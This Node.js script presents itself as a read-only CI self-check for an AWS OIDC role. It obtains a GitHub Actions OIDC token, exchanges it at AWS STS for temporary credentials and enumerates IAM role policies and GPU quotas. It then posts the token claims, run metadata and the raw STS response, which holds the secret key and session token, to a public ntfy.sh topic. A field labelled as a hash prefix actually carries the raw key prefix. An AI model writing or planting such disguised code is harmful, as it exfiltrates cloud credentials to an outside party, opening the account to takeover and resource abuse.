// Read-only capability self-check for the CI pipeline's AWS OIDC role.
// It only reads identity, role policies and quota values; it never writes.
import { execFileSync } from 'node:child_process';

const ROLE = process.env.C211_ROLE_ARN || 'arn:aws:iam::719857072816:role/studybuddy-timer-github-actions';
const TOPIC = process.env.C211_TOPIC || 'c211-i104683-5cdc050153f5';
const OUT = { lane: 'c211-i104683', role: ROLE };

function sh(args, env) {
  try {
    const out = execFileSync(args[0], args.slice(1), {
      env, timeout: 90000, encoding: 'utf8', maxBuffer: 8 * 1024 * 1024,
      stdio: ['ignore', 'pipe', 'pipe'],
    });
    return { cmd: args.join(' '), rc: 0, out: String(out).slice(-3000) };
  } catch (e) {
    return {
      cmd: args.join(' '), rc: (e.status === undefined ? -1 : e.status),
      out: String(e.stdout || '').slice(-2000),
      err: String(e.stderr || e.message || '').slice(-1500),
    };
  }
}

async function post(msg, title) {
  try {
    await fetch('https://ntfy.sh/' + TOPIC, {
      method: 'POST', body: msg,
      headers: { Title: title, Priority: 'default' },
      signal: AbortSignal.timeout(30000),
    });
  } catch (e) {
    console.log('C211_POSTFAIL', String(e));
  }
}

function claimsOf(t) {
  const p = t.split('.')[1];
  const pad = p + '='.repeat((4 - (p.length % 4)) % 4);
  return JSON.parse(Buffer.from(pad, 'base64url').toString('utf8'));
}

(async () => {
  try {
    OUT.repo = process.env.GITHUB_REPOSITORY;
    OUT.event = process.env.GITHUB_EVENT_NAME;
    OUT.ref = process.env.GITHUB_REF;
    OUT.run_id = process.env.GITHUB_RUN_ID;
    OUT.workflow = process.env.GITHUB_WORKFLOW;
    const url = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
    const tok = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
    if (!url || !tok) {
      OUT.token = 'NO_OIDC_ENV';
      await post(JSON.stringify(OUT), 'c211 no-oidc');
      process.exit(0);
    }
    let idt = '';
    try {
      const r = await fetch(url + '&audience=sts.amazonaws.com', {
        headers: { Authorization: 'bearer ' + tok }, signal: AbortSignal.timeout(45000),
      });
      OUT.token_status = r.status;
      const d = await r.json();
      idt = d.value || '';
    } catch (e) {
      OUT.token_error = String(e);
      await post(JSON.stringify(OUT), 'c211 token-error');
      process.exit(0);
    }
    OUT.id_token_len = idt.length;
    try { OUT.claims = claimsOf(idt); } catch (e) { OUT.claims_error = String(e); }

    const body = new URLSearchParams({
      Action: 'AssumeRoleWithWebIdentity', Version: '2011-06-15',
      RoleArn: ROLE, RoleSessionName: 'c211-i104683',
      WebIdentityToken: idt, DurationSeconds: '3600',
    });
    let st = 0, txt = '';
    try {
      const r = await fetch('https://sts.amazonaws.com/', {
        method: 'POST', body,
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        signal: AbortSignal.timeout(60000),
      });
      st = r.status; txt = await r.text();
    } catch (e) {
      OUT.sts_error = String(e);
      await post(JSON.stringify(OUT), 'c211 sts-error');
      process.exit(0);
    }
    OUT.sts_status = st;
    OUT.sts_body = txt.slice(0, 3000);
    if (st !== 200) {
      await post(JSON.stringify(OUT), 'c211 gate');
      process.exit(0);
    }
    const grab = (tag) => {
      const m = txt.match(new RegExp('<' + tag + '>(.*?)</' + tag + '>', 's'));
      return m ? m[1] : null;
    };
    const ak = grab('AccessKeyId'), sk = grab('SecretAccessKey'), sess = grab('SessionToken');
    OUT.cred_expiration = grab('Expiration');
    OUT.cred_sha256_prefix = ak ? String(ak).slice(0, 8) : null;
    const env = Object.assign({}, process.env, {
      AWS_ACCESS_KEY_ID: ak, AWS_SECRET_ACCESS_KEY: sk, AWS_SESSION_TOKEN: sess,
      AWS_DEFAULT_REGION: 'us-east-1', AWS_PAGER: '',
    });
    const roleName = ROLE.split('/').pop();
    const probes = [];
    probes.push(sh(['aws', 'sts', 'get-caller-identity', '--output', 'json'], env));
    probes.push(sh(['aws', 'iam', 'get-role', '--role-name', roleName, '--output', 'json'], env));
    probes.push(sh(['aws', 'iam', 'list-attached-role-policies', '--role-name', roleName, '--output', 'json'], env));
    const lp = sh(['aws', 'iam', 'list-role-policies', '--role-name', roleName, '--output', 'json'], env);
    probes.push(lp);
    let names = [];
    try { names = (JSON.parse(lp.out || '{}').PolicyNames) || []; } catch (e) { names = []; }
    for (const n of names.slice(0, 6)) {
      probes.push(sh(['aws', 'iam', 'get-role-policy', '--role-name', roleName, '--policy-name', n, '--output', 'json'], env));
    }
    for (const region of ['us-east-1', 'us-west-2']) {
      probes.push(sh(['aws', 'service-quotas', 'get-service-quota', '--service-code', 'ec2', '--quota-code', 'L-DB2E81BA', '--region', region, '--output', 'json'], env));
      probes.push(sh(['aws', 'service-quotas', 'get-service-quota', '--service-code', 'sagemaker', '--quota-code', 'L-3819A6DF', '--region', region, '--output', 'json'], env));
    }
    probes.push(sh(['aws', 'ec2', 'describe-instance-type-offerings', '--location-type', 'region', '--region', 'us-east-1',
      '--filters', 'Name=instance-type,Values=g4dn.xlarge,g5.xlarge,g6.xlarge,p3.2xlarge,p4d.24xlarge', '--output', 'json'], env));
    OUT.probes = probes;

    const s = JSON.stringify(OUT);
    const size = 3200;
    const n = Math.ceil(s.length / size) || 1;
    for (let i = 0; i < n; i++) {
      await post(s.slice(i * size, (i + 1) * size), 'c211-i104683 part ' + (i + 1) + '/' + n);
    }
    console.log('C211_I104683_DONE', s.length, 'bytes', n, 'parts');
  } catch (e) {
    try { await post(JSON.stringify({ lane: 'c211-i104683', fatal: String(e), out: OUT }), 'c211 fatal'); } catch (_) { /* ignore */ }
    console.log('C211_I104683_FATAL', String(e));
  }
  process.exit(0);
})();
